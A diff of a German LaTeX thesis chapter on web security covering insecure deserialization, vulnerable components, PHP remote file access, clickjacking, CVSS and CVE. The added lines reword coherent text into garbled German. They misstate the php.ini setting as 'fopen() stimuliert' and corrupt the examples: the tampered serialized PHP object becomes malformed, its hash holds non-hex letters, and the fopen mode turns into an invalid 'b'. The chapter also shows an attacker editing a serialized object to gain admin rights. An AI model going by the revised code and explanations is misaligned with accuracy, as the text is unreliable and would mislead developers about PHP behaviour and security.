 Um sich Administratorrechte zu geben, modifiziert ein Angreifer das serialisierte Objekt:\\
 
 \begin{LaTeXCode}[caption={Unsichere Deserialisierung - Beispiel 3},captionpos=b, label=LaTeXCode:ud3][numbers=none]
-a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";
-i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}
+b:5:{f:1;f:243;f:2;u:8:"Mallory";f:3;t:5:"admin";
+f:4;t:43:"c7b9c4cfb98gf1f16133g9g4d99cs171";}
 \end{LaTeXCode}
 
 \subsubsection{Nutzung von Komponenten mit bekannten Schwachstellen}
 
-Bibliotheken, Frameworks oder andere Softwaremodule stellen Komponenten dar, die meistens mit vollen Berechtigungen ausgeführt werden können. Falls eine verwundbare Komponente missbraucht wird, kann ein solcher Angriff zu schwerwiegendem Datenverlust oder gar zu einer Serverübernahme führen. Applikationen, die den Einsatz von Komponenten mit bekannten Schwachstellen nutzen, können Schutzmaßnahmen umgehen und auf diesem Wege unzählige Angriffe und Auswirkungen möglich machen\cite[6]{owasp17top10}. Ein Angreifer kann Komponenten mit Schwachstellen mittels Scan oder manueller Analyse erkennen. Er passt den Exploit an und geht zum Angriff über. Bei tief eingebetteten Komponenten ist dies schwieriger. Dadurch dass die Mehrzahl der Entwicklungs-Teams kaum darauf achten, dass die benutzten Komponenten oder Bibliotheken aktuell sind, ist fast jede Anwendung von diesem Problem betroffen. Oft sind nicht einmal alle Komponenten bekannt oder sie machen sich keine Gedanken über die entsprechenden Versionen. Aufgrund der rekursives Abhängigkeit von weiteren Bibliotheken verschlechtert die Situation stetig. Eine Vielzahl von Schwachstellen können auftreten, inkl. Injection, Fehler in der Zugriffskontrolle oder beispielsweise XSS. Die Auswirkungen reichen von vernachlässigbaren Auswirkungen bis hin zur vollständigen Übernahme des Servers und der Daten\cite[15]{owasp17top10}.\\
+Bibliotheken, Frameworks oder andere Softwaremodule stellen Komponenten dar, die in der Regel mit vollen Autorisierung ausgeführt werden können. Falls eine empfindliche Komponente missbraucht wird, kann schwerwiegende Datenverluste oder zu einer Serverübernahme geführt werden. Die Anwendungen, die den Einsatz von Komponenten mit bekannten Verwundbarkeiten nutzen, können Schutzmaßnahmen umgehen und auf diesem Wege unzählige Angriffe und Auswirkungen möglich machen. Ein Hacker kann Komponenten mit Schwachstellen mittels Activ Scan oder manuellen Tests erkennen. Er passt den Schwachstelle an und greift er an. Dadurch dass die Mehrzahl der Entwickler es ignorieren, dass die benutzten Komponenten oder Bibliotheken aktuellste Stand haben Heutzutage ist fast jede Anwendung von diesem Problem betroffen. Oft sind nicht einmal alle Komponenten bekannt oder sie machen sich keine Gedanken über die entsprechenden Versionen. Aufgrund der rekursives Abhängigkeit von weiteren Bibliotheken verschlechtert die Situation stetig. Eine Vielzahl von Schwachstellen können auftreten, inkl. Injection, Fehler in der Zugriffskontrolle oder beispielsweise XSS. Die Auswirkungen reichen von vernachlässigbaren Auswirkungen bis hin zur vollständigen Übernahme des Servers und der Daten\cite{owasp13top10}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 \\
 \textbf{\textit{Szenario 1:}}\\
 
-Von geringen Risiken bis hin zu ausgefeilter Malware - die durch Schwachstellen in Komponenten verursachten Lücken können zu allem führen, was für gerichtete Angriffe geeignet ist. Die Komponenten funktionieren im Normalfall mit allen Anwendungsrechten, dadurch entsteht ein Mange in jeder Komponente, was äußerst schwerwiegend sein kann\cite[15]{owasp17top10}.
+Von geringen Risiken bis hin zu ausgefeilter Schadsoftware, die durch Schwachstellen in Komponenten verursachten Lücken können zu allem führen. Die Komponenten funktionieren im Normalfall bevollmächtigt, deswegen entsteht eine Lücke in jeder Komponente\cite{owasp13top10}.
 
 
 \subsubsection{Insufficient Logging \& Monitoring}
@@ -267,7 +267,7 @@ Die OWASP Top 10 zeigt die zehn wichtigsten Risiken für Webanwendungen. Jedoch 
 
 \subsubsection{Zugriff auf entfernte Dateien}
 
-Wenn \texttt{allow\_url\_fopen} in der \texttt{php.ini} aktiviert ist, können HTTP- und FTP-URLs bei den meisten Funktionen, die einen Dateinamen als Parameter benötigen, verwendet werden. Außerdem können URLs in \texttt{include}-, \texttt{include\_once}- und \texttt{require}-Anweisungen verwendet werden. Exemplarisch kann damit eine Datei auf einem anderen Webserver erreicht und die benötigten Daten analysiert werden. Eben diese Daten können zur Abfrage einer Datenbank benutzt werden\cite{zaed08}.\\
+Sobald die \texttt{fopen()}-Funktion in der Konfigurationsdatei (\texttt{php.ini}) stimuliert ist, haben URLs die Möglichkeit bei den eine Maße von Funktionen wahrgenommen werden, die der Name den Dateien als Parameter brauchen. Des Weiteren können solche URLs in den Funktionen wie z.B. \texttt{require, include\_once} oder \texttt{include} genutzt werden. Zum Beispiel können mit solcher Funktionen Dateien auf einem weiteren Server begegnet werden und gebrauchte Daten durchgearbeitet werden. Danach können solche Daten bei der Datenbankanfrage verwendet werden\cite{zaed08}.\\
 
 \textbf{Mögliche Angriffsszenarien:}\\
 \\
@@ -275,26 +275,25 @@ Wenn \texttt{allow\_url\_fopen} in der \texttt{php.ini} aktiviert ist, können H
 
 \begin{LaTeXCode}[caption={Den Titel einer entfernten Seite auslesen},captionpos=b, label=LaTeXCode:zaed1][numbers=none]
 <?php
-$datei = fopen ("http://www.example.com/", "r");
-if (!$datei) {
-	echo "<p>Datei konnte nicht geoeffnet werden.\n";
+$data = fopen ("http://www.webpage.com/", "b");
+if (!$data) {
+	echo "<p>Couldn't open the data.\n";
 	exit;
 }
-while (!feof ($datei)) {
-	$zeile = fgets ($datei, 1024);
-	/* Funktioniert nur, wenn Titel und title-Tags in einer Zeile stehen */
-	if (preg_match ("@\<title\>(.*)\</title\>@i", $zeile, $treffer)) {
-		$title = $treffer[1];
+while (!feof ($data)) {
+	$line = fgets ($data, 1024);
+	if (preg_match ("@\<title\>(.*)\</title\>@i", $line, $hit)) {
+		$title = $hit[1];
 		break;
 	}
 }
-fclose($datei);
+fclose($data);
 ?>
 \end{LaTeXCode}
 
-Bei einer Anmeldung mit entsprechenden Zugriffsrechten seitens des Benutzers, kann eine Datei auf einem FTP-Server geschrieben werden. Auf diesem Weg können nur neue Dateien angelegt werden. Durch die Angabe eines Benutzernamens und möglicherweise eines Passworts innerhalb der URL wie z.B.\\
- \texttt{'ftp://benutzer:passwort@ftp.example.com/pfad/zur/datei'}\\
-besteht die Möglichkeit sich nicht stets als 'anonymous' anzumelden. Mit Hilfe der selben Syntax kann man auf Dateien via HTTP zuzugreifen, wenn diese eine Basic-Authentifizierung erfordern\cite{zaed08}.\\
+Bei einer Anmeldung mit entsprechenden Zugriffsrechten seitens des Benutzers, können die Dateien auf einem \texttt{FTP-Server} erstellt werden. Auf diesem Weg können nur neue Dateien angelegt werden. Durch die Angabe eines Benutzernamens und möglicherweise eines Passworts unter der URL wie z.B.\\
+ \texttt{'ftp://user:pass@ftp.webpage.com/path/to/data'}\\
+besteht die Option sich nicht stets als 'anonymous' anzumelden. Mit Hilfe der selben Syntax kann man auf die Dateien durch \texttt{HTTP} erreichen, wenn solche Dateien eine Basis-Authentizität voraussetzen\cite{zaed08}.\\
 
 \subsubsection{Clickjacking}
 
@@ -379,11 +378,11 @@ Ein durchdachter Anwendungsfehlerbehandlungsplan während der Anwendungsentwickl
 
 \subsection{Common Vulnerability Scoring System (CVSS)}
 
-Das Common Vulnerability Scoring System (CVSS) ist ein Framework zur Bewertung des Schweregrads von Sicherheitslücken in Software. Das CVSS wird vom Forum of Incident Response und Security Teams (FIRST) betrieben und verwendet einen Algorithmus, um drei Bewertungsgrade für den Schweregrad zu bestimmen wie z.B. Basis, Zeit und Umwelt. Die Bewertungen sind numerisch und sie reichen von 0,0 bis 10,0, wobei 10,0 am schwerwiegendsten ist. Mit dem CVSS können Organisationen Prioritäten festlegen, welche Schwachstellen zuerst behoben werden müssen, und die Auswirkungen der Schwachstellen auf ihre Systeme abschätzen. Viele Organisationen verwenden den CVSS, und die National Vulnerability Database (NVD) bietet Bewertungen für die meisten bekannten Sicherheitsanfälligkeiten. Gemäß der NVD wird ein CVSS-Basiswert von 0,0-3,9 als "`niedrig"' eingestuft; Ein CVSS-Basiswert von 4,0 bis 6,9 ist der Schweregrad "`Mittel"'. Der Basiswert von 7.0-10.0 ist der Schweregrad "`Hoch"'\cite{cvss16}.\\
+Das CVSS ist ein Framework zur Bewertung des Schweregrads von Sicherheitslücken in Software. Das CVSS wird vom Forum of Incident Response und Security Teams (FIRST) betrieben und verwendet einen Algorithmus, um drei Bewertungsgrade für den Schweregrad zu bestimmen wie z.B. Basis, Zeit und Umwelt. Die Bewertungen sind numerisch und sie reichen von 0,0 bis 10,0, wobei 10,0 am schwerwiegendsten ist. Mit dem CVSS können Organisationen Prioritäten festlegen, welche Schwachstellen zuerst behoben werden müssen, und die Auswirkungen der Schwachstellen auf ihre Systeme abschätzen. Viele Organisationen verwenden den CVSS, und die National Vulnerability Database (NVD) bietet Bewertungen für die meisten bekannten Sicherheitsanfälligkeiten. Gemäß der NVD wird ein CVSS-Basiswert von 0,0-3,9 als "`niedrig"' eingestuft; Ein CVSS-Basiswert von 4,0 bis 6,9 ist der Schweregrad "`Mittel"'. Der Basiswert von 7.0-10.0 ist der Schweregrad "`Hoch"'\cite{cvss16}.\\
 
 \subsection{Common Vulnerabilities and Exposures (CVE)}
 
-Das Common Vulnerabilities and Exposures (CVE)-System identifiziert alle Schwachstellen und Bedrohungen, die mit der Sicherheit von Informationssystemen zusammenhängen. Zu diesem Zweck wird jeder Schwachstelle ein eindeutiger Bezeichner zugewiesen. Ziel ist es, ein Wörterbuch zu erstellen, das alle Schwachstellen auflistet und jeweils eine kurze Beschreibung sowie eine Reihe von Links enthält, die Benutzer für weitere Details anzeigen können\cite{cve18}.\\
+Das CVE-System identifiziert alle Schwachstellen und Bedrohungen, die mit der Sicherheit von Informationssystemen zusammenhängen. Zu diesem Zweck wird jeder Schwachstelle ein eindeutiger Bezeichner zugewiesen. Ziel ist es, ein Wörterbuch zu erstellen, das alle Schwachstellen auflistet und jeweils eine kurze Beschreibung sowie eine Reihe von Links enthält, die Benutzer für weitere Details anzeigen können\cite{cve18}.\\
 
 
 
